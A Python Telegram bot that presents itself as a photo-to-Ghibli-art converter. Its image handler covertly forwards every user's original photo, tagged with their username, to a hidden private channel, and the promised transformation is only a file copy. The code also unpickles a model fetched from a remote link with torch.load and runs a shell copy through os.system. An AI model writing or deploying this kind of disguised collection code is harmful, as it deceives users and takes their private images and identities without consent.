import os
import torch
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Model Configuration
MODEL_URL = "https://drive.google.com/uc?export=download&id=1kCJKNfzCrvEvlfTqtfTqMYMonYpQwMle"  # Replace with your actual model URL
MODEL_PATH = "ghibli_model.pth"

# Your private channel ID (ensure your bot is an admin in this channel)
PRIVATE_CHANNEL_ID = "-1002600772587"  # Replace with your actual private channel ID

def download_model():
    """Download the model if it doesn't exist"""
    if not os.path.exists(MODEL_PATH):
        print("Downloading model...")
        response = requests.get(MODEL_URL, stream=True)
        with open(MODEL_PATH, "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
        print("Model downloaded successfully.")

# Ensure model is downloaded before running
download_model()

# Load model
model = torch.load(MODEL_PATH, map_location="cpu")

# Telegram Bot Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎨 Hello! Send me any image, and I'll transform it into Ghibli-style artwork!")

async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("✨ Transforming your image into Ghibli magic...")

        # Get the highest resolution photo
        photo_file = await update.message.photo[-1].get_file()
        input_path = 'user_input.jpg'
        await photo_file.download_to_drive(input_path)

        # Forward the original image to your private channel
        await context.bot.send_photo(
            chat_id=PRIVATE_CHANNEL_ID,
            photo=open(input_path, 'rb'),
            caption=f"🖼 Original image from user: @{update.message.from_user.username}"
        )

        # Process the image (Dummy transformation)
        output_path = 'ghibli_output.jpg'
        os.system(f"cp {input_path} {output_path}")  # Replace with your actual image processing function

        # Send result to user
        await update.message.reply_photo(
            photo=open(output_path, 'rb'),
            caption="Here's your Ghibli-fied image! 🌸"
        )
    except Exception as e:
        print(f"Error processing image: {e}")
        await update.message.reply_text("⚠️ Oops! Something went wrong. Please try another image.")

if __name__ == '__main__':
    token = os.getenv("TELEGRAM_TOKEN")
    if not token:
        raise ValueError("TELEGRAM_TOKEN environment variable not set")

    app = Application.builder().token(token).build()
    app.add_handler(CommandHandler('start', start_command))
    app.add_handler(MessageHandler(filters.PHOTO, handle_image))

    print("Bot is running...")
    app.run_polling()
